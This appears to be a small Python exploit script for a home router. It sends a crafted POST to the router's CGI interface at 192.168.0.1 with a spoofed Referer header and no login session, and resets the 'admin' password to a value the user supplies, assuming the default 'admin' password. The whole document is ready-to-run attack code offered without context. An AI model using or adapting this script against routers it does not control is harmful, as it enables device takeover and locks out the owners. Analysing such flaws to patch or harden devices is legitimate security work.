import requests

new = input('New Pass: ')
url = 'http://192.168.0.1/cgi?8'
headers = {'Content-Type': 'text/plain',
 'Referer': 'http://192.168.0.1/mainFrame.htm'}

data = ''
data += '[/cgi/auth#0,0,0,0,0,0#0,0,0,0,0,0]0,3\x0d\x0a'
data += 'oldPwd=admin\x0d\x0a'
data += 'name=admin\x0d\x0a'
data += 'pwd='+new+'\x0d\x0a'

r = requests.post(url,data=data,headers=headers)

print(r.text)
